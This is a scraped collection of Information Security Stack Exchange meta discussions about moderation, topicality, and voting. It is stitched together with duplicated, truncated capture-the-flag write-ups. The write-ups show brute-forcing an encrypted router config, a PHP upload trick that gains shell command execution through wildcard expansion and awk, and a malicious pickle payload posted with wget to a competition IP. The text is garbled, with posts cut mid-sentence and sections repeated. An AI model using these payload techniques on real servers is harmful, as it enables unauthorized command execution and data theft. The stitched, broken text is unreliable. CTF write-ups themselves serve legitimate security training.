<p>Despite the public nature of the site (and the reputation points for the accepted answer), the people posting retain responsibility for their content. If a user posts sensitive content, then the mods should support the user's request for removal. If this question is asking about a 3rd party asking for someone else's question to be removed, then I would reach out the user that posted the material to either work with the user to substitute the sensitive material or to seek approval to remove the question. If a conflict remains, then the 3rd party might need to prove that the material is under their control and the mods would have to work together to come up with a solution.</p>

<p>Community managers have a tough job ahead of them. The vast variety of personalities, motivations, and preconceptions they have to somehow mold into a cohesive happy unit sounds pretty dang daunting to me. To my mind they're here to support us so anything I can do to not make it harder is the only right choice. I definitely respect the work they do and have even developed a friendship with some of them in the past. Beyond the community team, through my long term involvement both here and at ServerFault, I have come to know a large group of moderators and StackExchange employees. All of whom I respect as people or colleagues and would enjoy working with.</p>

<p>The specific thread mentioned is an interesting one. A simple text search will show my name in there a few times. My concern from the beginning was entirely based in the communication and a desire to see that the investigation was handled well. While I still believe the public communication was somewhat less than ideal I feel pretty comfortable in how the investigation went down. Both Shog's final analysis and comments from technical staff lead me to believe the cleanup, at least, was handled with the kind of care a former forensics kid would appreciate.</p>

</blockquote>

<p>Personally I've found the biggest challenge is lack of question interest. It's been quite some time since I've seen a question that I <em>want</em> to spend the time answering. As far as the site itself I believe the content as a whole is certainly up to snuff. What I think we could use is some organization and general editing. We currently have on the order of 23k questions and 47k answers. That's...a lot. It's time we did another tag audit and cleaned them up. Then just generally going through and editing posts for clarity and readability. Neither of those tasks necessarily require moderator privileges but the work can be made easier with them, tagging particularly.</p>

</blockquote>

<p>Based on the sample questions and description I see nothing in HackOverflow that is not already explicitly on-topic here. Gilles did an excellent job of diving into the root of the matter and pointing out the Great Hat Color War. The HackOverflow and HackExchange proposals are as far as I'm concerned an unfortunate consequence of the overloaded use of the word ""hack"" and a misunderstanding of the difference between on-topic and bad or not suitable for the SE format.</p>

<p>Privacy is much more interesting. It's definitely true that many Information Security folk get deeply into privacy issues as a hobby but is one a super-set of the other? The proposed questions are a mishmash of topicality. Some of them are definitely on-topic on Sec.SE, others...I'm not so sure. Let's look at our mission statement.</p>

<hr>

<p>IT Security Stack Exchange is for Information Security professionals to discuss protecting assets from threats and vulnerabilities. Topics include, but are not limited to:</p>

<ul>
<li>web app hardening</li>
<li>network security</li>
<li>social engineering, including phishing</li>
<li>risk management</li>
<li>policies</li>
<li>penetration testing</li>
<li>security tools</li>
<li>using cryptography</li>
<li>incident response </li>
<li>physically securing the office, datacentre, information assets etc.</li>
</ul>

<hr>

<p>While many companies do have privacy policies as part of their Information Security or Compliance programs there's not much else in the list that looks immediately applicable to me. I would love to hear someone argue for Privacy being a subset, it would be a great discussion. This means the real question is <em>should</em> Privacy be covered under Security.SE. I'll have to think on that some more and let the idea stew. I would say likely no but it's something we should have more discussions about as a community and give the collective a chance to weigh in.</p>

<blockquote>
  <p>How would you deal with a user who produced a steady stream of valuable answers, but tends to generate a large number of arguments/flags from comments?</p>
</blockquote>

<p>This is a particular challenge. We definitely want to reward and encourage useful content but if it results in generating a toxic atmosphere? That's not good. The first step should always be an adult conversation with the person in question. Let them know that a segment of the population, significant enough to make the conversation happen, has some concerns and to keep them in mind. It's been my experience that most people, even on the Internet, are reasonable and are willing to be at least put forth some effort to not be a raving jerk. If the conversation, and accompanying corrective nudges, aren't effective then we have to start looking at cooling off periods. I hate the idea of forcibly ejecting users who are actually valuable but we also can't allow someone freedom to disenfranchise or drive off others simply because they're useful.</p>

<blockquote>
  <p>How would you handle a situation where another mod closed/deleted/etc a question that you feel shouldn't have been?</p>
</blockquote>

<p>Much like above this is where the adult conversation happens. Preferably behind closed doors. I have had long experience with the moderation team here and trust them all. If, after hearing their reasons, I still wasn't convinced then I would ask another member of the mod team for their opinion. I like to think that I'm generally open to other people's ideas and would go with the consensus at that point. While I would prefer to agree with a decision I'm not against going along with the majority so long as I feel that it's been reached reasonably and dissent was allowed to be heard.</p>

<blockquote>

<p>When it comes to close votes a moderator is in a funny spot. We can't exactly do anything about zealous closing. In fact we can only make the situation worse! Our best option would be to keep an eye on questions that go through the close vote queue and re-open any that maybe should have stayed open. Other than that it's pure horse trading by trying to encourage the community to slow down before voting.</p>

<p>I've been pretty vocal about this issue since the beginning. As a long time participant and contributor to ServerFault I would frequently see swarms of mods swoop into the chat room and start throwing around calmbalms like a rapper at a rave. The culture of each site's chat rooms are just as unique as the site itself. What seems offensive to one group may not be to another. As such I would try to do the same thing I do now when processing chat flags; err on the side of neutral. If I felt compelled to oversee I would at least start with saying that I came in because of a boatload of flags and ask if there's a problem. Let the community let me know what they find acceptable instead of me trying to force my own notions on them.</p>

<p>This is a hard one. We presuppose that the problem can't be solved at the source so instead we must handle it on the back-end. I believe we're going to have to take a multipronged approach. Firstly, it means closing questions quickly, before they have a chance to collect answers. Secondly, making sure that close questions all get closed to a single canonical question so that it will trickle up in the FAQ section. Thirdly, and perhaps most importantly, make sure that canonical question is awesome so that it has all the right SEO magic. Google is our best friend here. If the asker finds their answer first then everybody wins.</p>

Understanding Commenting,"<p>New users are deliberately not allowed to post comments (except under their own posts), precisely to avoid what you're trying to do. This is a <a href=""http://security.stackechange.com/tour"" rel=""nofollow"">question and answer site</a>. Comments distract from the main purpose of the site.</p>

<p>Stack Exchange was explicitly designed to avoid the problems of forums where the conversation drifts, the useful answer is somewhere in the middle, there's a post on the first page that looks fine but is actually obsolete, while the last page has moved to a completely different topic. On Stack Exchange, a question has answers, and that's it.</p>

<p>If you have a follow-up question, post a new question. You may cite the previous question if you think it's relevant, but be sure to make your question self-contained.</p>

<p>If you have an answer for the question, go ahead and answer. Make sure that your post does answer the question. If all you wanted to do was a minor update to an existing answer, you can go ahead and edit that answer. Asking, answering and editing have no minimum reputation requirement and editing doesn't even require an account (but edits undergo a review process before they're accepted unless you have 2000 reputation).</p>

Understanding Commenting,"<p>This is the user's first post <em>now</em>. The first post review system picks up a user's first non-deleted post on the site. What happened is presumably that the user's first post was deleted, so his second post went into first post review.</p>

<p>I guess the intent is to route a user's first posts through review until one sticks — if post 1 is deleted, post 2 should be reviewed like post 1. But it also sometimes picks up extremely old posts from users who are by now well-established. I remember being told by Stack Exchange staff that this is by design, though I can't find the post/comment/chat message now.</p>

Will my profile be suspended if I upvote a (almost) daily active user?,"<p>If all (or almost all) of your votes are for a single individual, then the first thing that would happen is that the votes would be cancelled. This is because this activity looks far too much like deliberately sock-puppeting or vote fraud.</p>

<p>Suspension is unlikely to happen unless you repeatedly do something against site rules. I'm not sure if that includes multiple instances of having your votes rolled back under the previous rule (and SE deliberately keep the specifics of these rules a secret so individuals do not try and game the system)</p>

<p>If in the course of normal voting, a particular individual gets a lot of upvotes, this probably isn't a problem, but make sure you also give time to others who may have good posts as well, and upvote them if they deserve it. Remember, votes are for posts (questions or answers) that you feel are good, or that help you, or are well written etc. Votes don't need to be saved for just the best posts - those ones will become evident as they earn many more votes.</p>

Will my profile be suspended if I upvote a (almost) daily active user?,"<p>I don't think you'll find many lawyers who are security experts at the same time, some questions require deep understanding of networking and security.</p>

Will my profile be suspended if I upvote a (almost) daily active user?,"<p>Just as a moderator pro tem on Law - (hi, InfoSec! <em>waves</em>)...</p>

<p>We have received a number of inbound migrations, and of them, the most successful are those that don't presume domain knowledge - the reason for this is, well, lawyers aren't usually infosec professionals. (I don't even know if I'm using that right, <em>infosec</em>?) Anyway, there are a few that have received little attention because the legal experts on our site just don't know how to answer them, because they don't really understand the questions.</p>

<p>My answer is - yes, feel free to migrate things <em><a href=""https://law.stackexchange.com/help/on-topic"">if they are on-topic for Law</a></em>, but we will almost certainly need the asker to rephrase in lay terms if it includes even a moderate amount of jargon.

Why can not I cancel a wrong review?,"<p>The following assumes there is a reasonable number of hyperlinks that point back to any StackExchange site.  </p>

<p>What can we do with a month's worth of StackExchange posts posted in the DMZ? I have no idea, but mining the metadata might give insight such as:</p>

<ul>
<li>Popular sister sites (Links to crypto, serverfault, stackoverflow)</li>
<li>Upvotes / Downvotes of linked questions</li>
<li>Aggregate tag count of linked Q's</li>
<li>Activity / Views</li>
</ul>

<p>We might discover that we use the chat room as an administrative way to maintain the site (no spam or off topic questions) or if we discuss hot &amp; relevant questions or answers.  Or if we're mostly posting jokes, and memes.</p>

<p>Maybe we are in the DMZ to talk about smart security questions during the school year and take off or fight spammers in the summers.  </p>

<p><strong>Top votes of linked questions</strong></p>

<pre><code>       Closed  Deleted  votes&gt;5  votes&gt;10   
May     3        1         9        11

</code></pre>

<p>Or we can think about a topic's popularity... besides ""count"", StackExchange links could highlight certain [tags], such as SSL, encryption, Cloud, or privacy.  This would make old forum chats more relevant to the Q&amp;A model of the SE network</p>

<p><strong>TopTags of linked questions</strong></p>

Contradiction towards the policy regarding on-topic subjects?,"<p>A: ""I'm using this tool to do X, but I have general questions about its use."" </p>

<p>vs </p>

<p>B: ""What tool do I use to do X?""</p>

<p>vs</p>

<p>C: ""Tool X isn't working. How do I use it?""</p>

<p>A is on-topic. It shows knowledge, understanding, and context. It is possible for questions to survive the use of the tool into more general tool use.</p>

<p>B is off-topic because tools go in and out of favour, new tools rise, questions go stale.</p>

<p>C is the big debate. Theoretically, they could be on topic, but in practice, questions of this type have needed to go to product-specific forums or the vendor/dev's support page. Alternatively, I've seen a lot of questions that should go to SuperUser as a general software config question. Most of the questions I've seen are answered by RTFM. </p>

<p>Personally, if C cannot be answered by RTFM or the vendor support page, and the question shows an understanding of the technology and the problem, it is on-topic here.</p>

<p>With the death of Hackoverflow, the community might need to assess how much of C we need to take on. </p>

Contradiction towards the policy regarding on-topic subjects?,"<p>Speaking from a purely utilitarian perspective, starring a question is more convenient than doing it in the browser. Unless you have an elaborate browser-synchronization scheme, that is. Starred questions remain with you wherever you go, on all devices.</p>

<p>As for sending a signal to the OP. there's no clear way to read what a star means, unlike an up- or downvote. Please also note that stars are not anonymous, so downvoting and starring after a short interval may eventually (next Sunday) leak your vote through SEDE (dunno about the API). </p>

What is our rank in the community of Information Security forums?,"<p>To me, Security Stack Exchange occupies a niche that no other online resource fits, so I'm not sure whether comparison is the right activity.</p>

<p>Paid resources such as ISF and ISACA provide some very structured materials, and there are various forums that are 'classic' discussion forums at all levels of technical specialisation, but none of those fill the same Q&amp;A space.</p>

<p>Now, I am of the opinion that this means in some areas we lose out on some specialist information, where individuals may well post on a dedicated forum, but in other areas, we have leading edge information (eg the Bears and others on new vulnerabilities) and we have a very collaborative and encouraging site that does provide an element of mentoring, and a scope of questions from complete beginner to expert in a wide range of security areas - and I don't see this anywhere else.</p>

<li><p>People needing a long explanation on a very basic topic, or people asking a lot of question on the same subjects or adding new questions while they get answers to the previous ones.</p>

<li><p>People mixing up unrelated terms and technologies into some nonsense gibberish, or having no clear idea about what they actually want or need (the famous ""I want better security"" without knowing against which threats).</p>

<p>All this seems perfect fit for the ""Unclear what you're asking"".</p></li>
<li><p>People having a too higher and non-technical view of an issue and asking a question through the scope of an anti-virus or other end-user software message, or asking how to achieve something using their GUI or web interface.</p>

Should abbreviation be written in small caps or in lower case?,"<p>For Stack Exchange, I'd suggest never using small caps, or any Unicode chars that aren't standard, for a couple of reasons:</p>

<li>It makes it very difficult to read — many people don't have wide sets of fonts.</li>
<li>Search engines will not necessarily handle things gracefully.</li>

Should abbreviation be written in small caps or in lower case?,"<p>Actually, it is generally agreed that <a href=""https://en.wikipedia.org/wiki/Acronym"" rel=""nofollow noreferrer"">acronyms</a> are written in uppercase. While some styles use small caps for acronyms, this is rare.</p>

<p>In any case, Stack Exchange does not have small caps <a href=""https://security.meta.stackexchange.com/editing-help"">formatting</a>, so the question is moot.</p>

<p>Unicode has some characters that look like Latin small caps letters, but their semantics is <em>not</em> small caps, only their visual appearance. (They're mostly phonetic symbols.) Since their semantics is not that of letters, they should not be used to represent letters, otherwise a lot of software will interpret them incorrectly (e.g. when searching text). Furthermore many fonts lack some or all of those characters, which are rarely used.</p>

Does it make a sense to add own answer over an already accepted answer?,"<p>You just made the first step, and hopefully, our reviewers also read our meta.</p>

<p>Agreed, suggesting edits from same person accounts could be used to gain site reputation (say, <a href=""https://security.stackexchange.com/help/privileges/new-user"">only 10 reputation points are needed to remove new user restrictions</a>, i.e. only 5 suggested edits which, if they were made on same user contributions, the same user can approve from that other account), and it gets worse in that the <em>standard query</em> that Stack Exchange stuff run when asked to merge accounts doesn't invalidate any reputation gain by suggesting edits on own contents (I tested that). So there's good reasons to be cautious.</p>

<p>Here's a couple of things to do when you suspect, for any reason, that two accounts are of the same person:</p>

<ul>
<li>Reject suggested edit, mentioning in the reason for rejection that the person suggesting it can edit with original account, and if they can't access their contents with their old account (happens, many first post some question or answer from one computer, then register from another), request via flags, in chat,... that accounts are merged.</li>
<li>Stop by in <a href=""https://chat.stackexchange.com/rooms/151/the-dmz"">our chat room</a> and ping one of our moderators with request that accounts be looked into and merge requested (mods can't do that but we have a simple enough request form to fill for that), if warranted. You may also want to raise a custom flag for moderator attention on the post itself and explain what you suspect is going on.</li>
<li>See if the post needs editing anyway, and if it does, hit the <em>reject and edit</em> button, edit and submit so the suggested edit review queue is cleared of that item and isn't later approved by next two reviewers that missed this, erm, <em>user correlation</em>, let's put it mildly.</li>

Editing posts without a clear question,"<p>So I've been browsing the documents tab, and I have to agree. We should burn the tag... Or replace it with more meaningful tags. That'd be my vote.

<p>Of course as you can plainly see I'm not the best tag maker ever(hence why I DON'T make tags), but just burning it seems like a bad idea, when really what it needs is a refactoring.</p>

",<discussion>,17,,402
Is it OK to reply to a question with a comment about searching Google?,"<p>There has been a lot of discussion, both in Meta and in the DMZ, regarding questions that lack research. We require that people do at least a little research before asking here. This helps the community in two ways: by not encouraging answers that are simply links to external sources, and it prevents the Answerers from wasting their time submitting an answer that would be rejected because the OP doesn't like the direction of the research the Answerer took. Research, as always, helps to define the scope of the question.</p>

<p>In StackOverflow, and with programming questions, it is possible to have multiple different perspectives with multiple different approaches, so even if the question might have an answer elsewhere, there is still value in that community devising its own answers. But for a factual question asking a yes/no answer (e.g. ""can experts recover data from a damaged magstripe?""), there is nothing this community can provide that would be unique or with value added. Yes, there is a machine that appears to do it.</p>

<p>As for some of the points in your question:</p>

<ul>
<li>it has nothing to do with whether or not the topic is trivial, it has to do with raising the quality of the question so that the answers can be of high quality, too</li>
<li>be careful of claims that Google searches places the Sec.SE question at the top of the search results, try the search in a fresh browser that is not connected to your Google account because Google learns what sources you value</li>
<li>without understanding the full intent and previous research efforts of the OP, it is difficult to craft a comment in response in such a way that encourages the OP to either disclose the research that was done or to prompt the OP to perform some research in order to refine the question</li>
</ul>

<p>Yes, in some cases, where it is clear the OP has performed zero research effort in an easily searchable topic, my comments are terse (""A Google search produces rich results""). In the question you linked, though, I provide a sample answer in hopes to get a response from the OP in the light of a proposed answer, which resulted in the OP disclosing the full question the OP wanted to ask. In my experience, my approach has had this effect, and ends up getting the OP to raise the quality of the question.</p>

<li>It must be 220x250 pixels - retina is not even vaguely relevant here. ""With Retina support"" does not make your image 220x250. It is 440x500. The image itself needs to be exactly the right size in pixels</li>
<li>Yes, it must be a GIF or PNG</li>
</ul>

<p>Those two aren't negotiable.</p>

<p>My understanding of your final point is a bit woollier,and I'm happy to defer to others who understand these kind of licences better than I:</p>

<ul>
<li>This image requires attribution, and this is not going to be readable when this image is resized, and as I understand it, crediting the original work may not be doable from the voting collection page - this will vary based on the licence a particular image is provided under.</li>

Are DRM related questions on-topic here?,"<p>DRM itself as a topic, absolutely is in scope here.</p>

<p>Questions on DRM, however, may be difficult to ask here, as DRM itself is fundamentally useless for most implementations - such as preventing piracy - and if we exclude environments where every piece of hardware and every access is completely controlled, it just doesn't work. So most questions on it seem to ask about how to use it to protect X or how strong it is etc - these questions are of no value.</p>

Are DRM related questions on-topic here?,"<p>I'm going to agree and disagree with Rory.  I agree that DRM questions are on-topic.  I disagree that asking questions about the ability of DRM aren't of any value.  </p>

<p>DRM is often a failing game depending on who you're trying to protect your thing from.  But much of the world is still convinced that you can somehow have perfect protection, or that it's simply a ""cat and mouse game"".  The latter is at least a little true, but is still a vast oversimplification.  It's more like a cat/mouse game where Tom is the Cat, and Jerry is the mouse.  The protector (Tom) largely always loses and is overpowered by the mouse, Jerry.</p>

Is this question about allowing SSLv3 on topic?,"<p>From my perspective, the question is off-topic. It is actually more of a SuperUser-type question, as the answers indicate that the solution is found in a browser config. So, I can see your confusion.</p>

<p>But, it turns out to be an interesting problem, and this community loves puzzles. This question was highly voted, along with the accepted answer before I came across it, and decided to leave it simply due to its popularity. </p>

<p>So, strictly speaking, it's off-topic, but this is a community site, and the community regulates itself, so, some of the interesting but off-topic stuff stays alive.</p>

<p>Dog training is tangentially relevant to security, and loosely at that, and the solutions are found in the realm of dog training and not security. The <em>effect</em> might end up applied to security, but the question itself is about dogs, not security. From my perspective, loosely tangentially relevant questions (and we get a lot of those) need to be directed to the community that will best provide an answer and the application of that answer to security is left as an exercise for the reader. </p>

Is this question about allowing SSLv3 on topic?,"<p>As you surmise, the question is off-topic. It isn't about designing or analyzing a security policy. It isn't even about configuring a tool to implement a security policy, which is strictly speaking off-topic (configuring IT tools is off-topic here, and usually on-topic on sites such as <a href=""https://superuser.com/"">Super User</a>, <a href=""https://unix.stackexchange.com/"">Unix &amp; Linux</a>, <a href=""https://android.stackexchange.com/"">Android</a>, <a href=""https://serverfault.com/"">Server Fault</a>, <a href=""https://networkengineering.stackexchange.com/"">Network Engineering</a>, etc.) but is sometimes borderline as there isn't a clear-cut line between understanding the policy and approximating it with the tool's capabilities (on-topic) and figuring out what to write in the configuration file (off-topic). Nor is it about using tools primarily used by security professionals (e.g. penetration testing or forensic tools).</p>

<p>The question asks how to find a program supporting a particular protocol (SSLv3). The fact that the reason such programs are hard to find is related to security isn't relevant to the question. It's no different from “I have an old, forgotten server that only supports rsh but I only have SSH clients, how can I connect to it?” or “I have an old, forgotten server that only accepts Gopher requests, how can I send one?”.</p>

<p>It seems that some people have voted to leave the question open, possibly because the question went viral and got a lot of views. Please don't do that. Having a lot of view, or having a high score, is not a reason to keep an off-topic question open. Migrating this question to Super User is the correct action. (Or perhaps closing it as unclear, because the asker didn't specify what operating system they have available — but in a typical office we can probably presume that Windows and Linux are available.)</p>

<h2>Write-up</h2>

<p>After a quick hexdump we might realize that the first 4 bytes are looking pretty much like a magic header.</p>

</code></pre>

<p>After searching for ""CFG1"" with the search engine of our choice, we might find <a href=""https://heinrichs.io/207"" rel=""nofollow"">this</a> blog entry.  This tells us it might be a firmware image of some router (or at least something which looks like it).<br>
There is a windows tool on that website to decrypt the firmware images, lets see if it works for us:</p>

<pre><code>decrypting config.bin...
reading config.bin... 13056 bytes read.
parsing header... ok.
setting crypto key... ok.
decrypting... MD5 of plaintext invalid.
</code></pre>

<p>Hmm, nope. That looks like it might be in deed the right algorithm, but something is wrong (maybe the password).<br>
Well, that would have been too easy otherwise.<br>
So lets try if we can parse the file header with the information provided in that block entry.
As a a python ctypes Structure the header looks like this:</p>

<pre><code>class Header(ctypes.BigEndianStructure):
    _fields_ = [
                (""magic"", ctypes.ARRAY(ctypes.c_char, 4)),
                (""payload_size"", ctypes.c_uint32),
                (""header_md5"", ctypes.ARRAY(ctypes.c_ubyte, 8)),
                (""etl"", ctypes.ARRAY(ctypes.c_uint8, 7)), # always zero
                (""unused_1"", ctypes.c_char),
                (""password_len"", ctypes.c_uint16),
                (""padding_len"", ctypes.c_uint16),
                (""unused_2"", ctypes.ARRAY(ctypes.c_ubyte, 4)),
                (""plaintext_md5"", ctypes.ARRAY(ctypes.c_ubyte, 16))
                ]
</code></pre>

<p>The header contains a field for the first 8 bytes of a md5 over the header. After testing if it is correct, we can be pretty sure the header structure is right.<br>
So, chances are good we need to find the correct password.<br>
~~Stupidly~~Luckily the length of the password is saved in the header and an MD5 sum over the plaintext, too (The password is of 5 chars length).
According to the linked blog post the <em>plaintext</em> is encrypted with AES256 in ECB mode.
That sounds reasonable enough to bruteforce it.<br>
... But it is way to slow. The decryption of the whole cryptext needs way to long (~13kb after all).<br>
With ~8k tries per second we'll never find the password.</p>

<p>Maybe we find some other way to verify the password.<br>
After some searching we might find out that the plaintext of the images in this format always seem to be gzip compressed.<br>
This is <strong>awesome</strong>, as the gzip format has a 3 byte (2 byte in theory, 3 in fact) magic header.<br>
So we only need to decrypt the first block with AES and verify the first 3 bytes (With additionally md5 verification IF the magic header was found).<br>
This gives us about 280k try per second. Not really fast, but it might be fast enough for a password with 5 chars.<br>
Finally we can start bruteforcing.
After some (more) time we find our password and are able to decrypt the file.<br>
It is an tar.gz archive containing two files.
Digging through them we find a line like this <em>(password changed)</em>:</p>

<pre><code>PASSWORD=""MzJDM19hc2QxMjE1NjRxMTIxZD/nU2NGE1NnNkMWYzMmFkMTMyYTQ1""
</code></pre>

<p>After removing that evil <code>/n</code> in there we are able to base64 decode it and get the password. <strong>YAY</strong></p>

<h2>Write-up</h2>

<p>After a quick hexdump we might realize that the first 4 bytes are looking pretty much like a magic header.</p>

<pre><code>hexdump -C config.bin | head
00000000  43 46 47 31 00 00 32 d0  ef 92 7a b0 5a b6 d8 0d  |CFG1..2...z.Z...|
00000010  30 30 30 30 30 30 00 00  00 05 00 03 00 00 00 00  |000000..........|
</code></pre>

<p>After searching for ""CFG1"" with the search engine of our choice, we might find <a href=""https://heinrichs.io/207"" rel=""nofollow"">this</a> blog entry.  This tells us it might be a firmware image of some router (or at least something which looks like it).<br>
There is a windows tool on that website to decrypt the firmware images, lets see if it works for us:</p>

<pre><code>decrypting config.bin...
reading config.bin... 13056 bytes read.
parsing header... ok.
setting crypto key... ok.
decrypting... MD5 of plaintext invalid.
</code></pre>

<p>Hmm, nope. That looks like it might be in deed the right algorithm, but something is wrong (maybe the password).<br>
Well, that would have been too easy otherwise.<br>
So lets try if we can parse the file header with the information provided in that block entry.
As a a python ctypes Structure the header looks like this:</p>

<pre><code>class Header(ctypes.BigEndianStructure):
    _fields_ = [
                (""magic"", ctypes.ARRAY(ctypes.c_char, 4)),
                (""payload_size"", ctypes.c_uint32),
                (""header_md5"", ctypes.ARRAY(ctypes.c_ubyte, 8)),
                (""etl"", ctypes.ARRAY(ctypes.c_uint8, 7)), # always zero
                (""unused_1"", ctypes.c_char),
                (""password_len"", ctypes.c_uint16),
                (""padding_len"", ctypes.c_uint16),
                (""unused_2"", ctypes.ARRAY(ctypes.c_ubyte, 4)),
                (""plaintext_md5"", ctypes.ARRAY(ctypes.c_ubyte, 16))
                ]
</code></pre>

<p>The header contains a field for the first 8 bytes of a md5 over the header. After testing if it is correct, we can be pretty sure the header structure is right.<br>
So, chances are good we need to find the correct password.<br>
~~Stupidly~~Luckily the length of the password is saved in the header and an MD5 sum over the plaintext, too (The password is of 5 chars length).
According to the linked blog post the <em>plaintext</em> is encrypted with AES256 in ECB mode.
That sounds reasonable enough to bruteforce it.<br>
... But it is way to slow. The decryption of the whole cryptext needs way to long (~13kb after all).<br>
With ~8k tries per second we'll never find the password.</p>

<p>Maybe we find some other way to verify the password.<br>
After some searching we might find out that the plaintext of the images in this format always seem to be gzip compressed.<br>
This is <strong>awesome</strong>, as the gzip format has a 3 byte (2 byte in theory, 3 in fact) magic header.<br>
So we only need to decrypt the first block with AES and verify the first 3 bytes (With additionally md5 verification IF the magic header was found).<br>
This gives us about 280k try per second. Not really fast, but it might be fast enough for a password with 5 chars.<br>
Finally we can start bruteforcing.
After some (more) time we find our password and are able to decrypt the file.<br>
It is an tar.gz archive containing two files.
Digging through them we find a line like this <em>(password changed)</em>:</p>

<pre><code>PASSWORD=""MzJDM19hc2QxMjE1NjRxMTIxZD/nU2NGE1NnNkMWYzMmFkMTMyYTQ1""

Please do not dump Wikipedia into tag wikis,"<p>Some of my personal thoughts:</p>

<p><strong>Converting</strong></p>

<p><s>As far as I know, converting answers to comments and vice versa is allowed to 10k rep. users.</s><br>
<em>Ok, this is false - thanks @grawity.</em></p>

<p>Personally, I think that merging this privilege with 3k rep. (close and reopen votes) or 10k tools could help solve problems quicker.</p>

<p><strong>Commenting privilege</strong></p>

<p>New users cannot post comments because of spam. Commenting privilege is granted on 50 rep. - that is 5 upvotes on answer. However, the privilege ""Remove new user restrictions"" is granted on 10 rep. - 1 upvote on answer or 2 on question. A user who has already provided a good answer or a good question should be able to comment. If somebody think that this will not be enough, then 20 rep. is also better.</p>

<p><strong>""Low quality posts"" queue</strong></p>

<p>The queue should beside ""Looks OK"" and ""Recommend deletion"" have one other button - ""Recommend conversion"".</p>

<p><strong>Message</strong></p>

<p>This is a full text of current message:</p>

<blockquote>
  <p>This does not provide an answer to the question. To critique or request clarification from an author, leave a comment below their post - you can always comment on your own posts, and once you have sufficient reputation you will be able to comment on any post.</p>
</blockquote>

<p>Already mentioned ""Recommend conversion"" button should leave no message at all.</p>

<p><strong>Flag option</strong></p>

<h2>web — TinyHosting</h2>

<p>We can upload files with the name of our choice and a content of up to 7 bytes, and we can then browse that file at a given URL of the form <code>/files/<em>HASH</em>/<em>CHOSEN_NAME</em></code> to get the content, where <code><em>HASH</em></code> is independent of the name (it's actually SHA-1(IP address + user agent)).</p>

<p><a href=""https://security.stackexchange.com/users/25859/hamza"">HamZa</a> did the hard work of finding that using <code>&lt;?=`?`;</code> as the content for a file with the extension <code>.php</code> would execute <code>?</code> as an external command, where <code>?</code> could be most any character. For example <code>&lt;?=`w`;</code> shows the server's load average and other information.</p>

<p>There's not much you can do with a one-character command, but fortunately there's another loophole: wildcards are expanded before the command is executed. So we can use <code>&lt;?=`*`;</code>, which expands to the list of file names in the current directory, which is the upload directory; this will execute the first file name in lexicographic order.</p>

<p>The upload directory contains at least the PHP file and <code>index.html</code>, so we need to arrange that the PHP script is at the end of the alphabet and to run a command that comes before <code>index.html</code>. We can even pass it arguments, as long as the command comes first, then the arguments in alphabetical order, with <code>index.html</code> and the PHP file in there somewhere. A nice lexicographically early command is <code>awk</code>, which has a shell escape (the <code>system</code> function). Hence this injection script:</p>

<pre><code>#!/bin/sh
user_agent='foo1'
encode () {
  printf '%s\n' ""$1"" | sed -e 's/%/%25/g' \
                       -e 's/ /%20/g' \

<p>Running <code>./upload 'ls /'</code> shows that there's a file called <code>/file_you_want</code>, and <code>./upload 'cat /file_you_want'</code> gives the flag.</p>

<h2>misc — gurke</h2>

<p>We have to submit input to a Python script. This script has the flag in a variable <code>flag.flag</code>. The input vector is a string that's passed to <code>pickle.loads</code> and printed out. There's a twist: we don't get to see the printout, but we do get to see a printout of any exception caused by the unpickling.</p>

<pre><code>data = os.read(0, 4096)
try:
    res = pickle.loads(data)
    print 'res: %r\n' % res
except Exception as e:
    print &gt;&gt;sys.stderr, ""exception"", repr(e)
</code></pre>

<p>So we need to find a pickled input that will cause an exception that displays the flag. The Python script loads a bunch of modules and sets up a sandbox environment that won't let it load other modules, but that turns out to be a bit of a red herring as I only needed <code>__builtin__</code> in the end.</p>

<p>After playing around in the interactive interpreter and looking at the source of <code>pickle.py</code> to understand the pickle format, I found that you could pass arbitrary function calls.</p>

<pre><code>wget -q -O - http://136.243.194.43/ --post-data=$'c__builtin__\ngetattr\n(S\'foo\'\nc__builtin__\ngetattr\n(c__main__\nflag\nS\'flag\'\ntRtR.'

<h2>web — TinyHosting</h2>

<p>We can upload files with the name of our choice and a content of up to 7 bytes, and we can then browse that file at a given URL of the form <code>/files/<em>HASH</em>/<em>CHOSEN_NAME</em></code> to get the content, where <code><em>HASH</em></code> is independent of the name (it's actually SHA-1(IP address + user agent)).</p>

<p><a href=""https://security.stackexchange.com/users/25859/hamza"">HamZa</a> did the hard work of finding that using <code>&lt;?=`?`;</code> as the content for a file with the extension <code>.php</code> would execute <code>?</code> as an external command, where <code>?</code> could be most any character. For example <code>&lt;?=`w`;</code> shows the server's load average and other information.</p>

<p>There's not much you can do with a one-character command, but fortunately there's another loophole: wildcards are expanded before the command is executed. So we can use <code>&lt;?=`*`;</code>, which expands to the list of file names in the current directory, which is the upload directory; this will execute the first file name in lexicographic order.</p>

<p>The upload directory contains at least the PHP file and <code>index.html</code>, so we need to arrange that the PHP script is at the end of the alphabet and to run a command that comes before <code>index.html</code>. We can even pass it arguments, as long as the command comes first, then the arguments in alphabetical order, with <code>index.html</code> and the PHP file in there somewhere. A nice lexicographically early command is <code>awk</code>, which has a shell escape (the <code>system</code> function). Hence this injection script:</p>

<pre><code>#!/bin/sh
user_agent='foo1'
encode () {
  printf '%s\n' ""$1"" | sed -e 's/%/%25/g' \
                       -e 's/ /%20/g' \
                       -e 's/!/%21/g' \

<p>Running <code>./upload 'ls /'</code> shows that there's a file called <code>/file_you_want</code>, and <code>./upload 'cat /file_you_want'</code> gives the flag.</p>

<h2>misc — gurke</h2>

<p>We have to submit input to a Python script. This script has the flag in a variable <code>flag.flag</code>. The input vector is a string that's passed to <code>pickle.loads</code> and printed out. There's a twist: we don't get to see the printout, but we do get to see a printout of any exception caused by the unpickling.</p>

<pre><code>data = os.read(0, 4096)
try:
    res = pickle.loads(data)
    print 'res: %r\n' % res
except Exception as e:
    print &gt;&gt;sys.stderr, ""exception"", repr(e)
</code></pre>

<p>So we need to find a pickled input that will cause an exception that displays the flag. The Python script loads a bunch of modules and sets up a sandbox environment that won't let it load other modules, but that turns out to be a bit of a red herring as I only needed <code>__builtin__</code> in the end.</p>

<p>After playing around in the interactive interpreter and looking at the source of <code>pickle.py</code> to understand the pickle format, I found that you could pass arbitrary function calls.</p>

<pre><code>wget -q -O - http://136.243.194.43/ --post-data=$'c__builtin__\ngetattr\n(S\'foo\'\nc__builtin__\ngetattr\n(c__main__\nflag\nS\'flag\'\ntRtR.'

"The ""history"" tag needs a Wiki description and a possible cleaning","<h1>smartcat2</h1>

